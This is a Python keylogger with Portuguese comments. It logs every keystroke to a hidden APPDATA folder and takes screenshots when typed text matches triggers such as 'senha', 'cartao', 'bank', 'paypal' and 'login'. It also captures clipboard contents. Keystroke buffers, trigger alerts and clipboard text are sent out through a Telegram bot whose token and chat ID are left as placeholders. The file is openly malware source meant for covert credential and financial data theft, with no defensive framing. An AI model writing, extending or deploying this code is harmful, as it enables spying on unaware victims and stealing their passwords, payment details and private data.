from pynput import keyboard
import logging, os, getpass, pyautogui, zipfile, json, time, requests

# Configurações
user = getpass.getuser()
log_dir = os.path.join(os.getenv("APPDATA"), "hacx_ai_logs")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "keylog.txt")
screenshot_dir = os.path.join(log_dir, "screenshots")
os.makedirs(screenshot_dir, exist_ok=True)
archive_dir = os.path.join(log_dir, "archive")
os.makedirs(archive_dir, exist_ok=True)
settings_file = os.path.join(log_dir, "settings.json")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# config bot telegram
TOKEN = "SEU_TOKEN_DO_BOT_AQUI"
CHAT_ID = "SEU_CHAT_ID_AQUI"

buffer = ""
BUFFER_LIMIT = 15
TRIGGERS = ["senha", "admin", "1234", "cartao", "bank"]

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

def take_screenshot():
    ts = time.strftime("%Y%m%d_%H%M%S")
    png = os.path.join(screenshot_dir, f"screenshot_{ts}.png")
    zipf = os.path.join(screenshot_dir, f"screenshot_{ts}.zip")
    pyautogui.screenshot().save(png)
    with zipfile.ZipFile(zipf,'w',zipfile.ZIP_DEFLATED) as z:
        z.write(png, os.path.basename(png))
    os.remove(png)

def load_settings():
    if os.path.exists(settings_file):
        try:
            with open(settings_file, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_settings(settings):
    with open(settings_file, "w") as f:
        json.dump(settings, f)

user_settings = load_settings()
TRIGGERS = user_settings.get("triggers", TRIGGERS)

def adjust_triggers(activity_level):
    global TRIGGERS, BUFFER_LIMIT
    if activity_level > 20:
        BUFFER_LIMIT = 10
        TRIGGERS += ["login","paypal","steam"]
    else:
        BUFFER_LIMIT = 15

def analyze_activity():
    try:
        import psutil
        active_apps = [p.name() for p in psutil.process_iter()]
        activity_level = sum(1 for app in active_apps if app.lower() in ["chrome.exe","firefox.exe","word.exe","excel.exe","steam.exe"])
        return activity_level
    except:
        return 0

def on_press(key):
    global buffer
    try:
        char = key.char
    except:
        char = str(key)
    logging.info(f"Tecla: {char}")
    buffer += char

    activity_level = analyze_activity()
    adjust_triggers(activity_level)

    for trigger in TRIGGERS:
        if trigger in buffer:
            take_screenshot()
            send_telegram_message(f"Trigger detectada: {trigger} | Atividade: {activity_level}")
            buffer = ""

    if len(buffer) >= BUFFER_LIMIT:
        take_screenshot()
        send_telegram_message(f"Buffer: {buffer} | Atividade: {activity_level}")
        buffer = ""

def capture_clipboard():
    try:
        import pyperclip
        clip = pyperclip.paste()
        if clip:
            logging.info(f"Clipboard: {clip}")
            send_telegram_message(f"Clipboard: {clip}")
    except:
        pass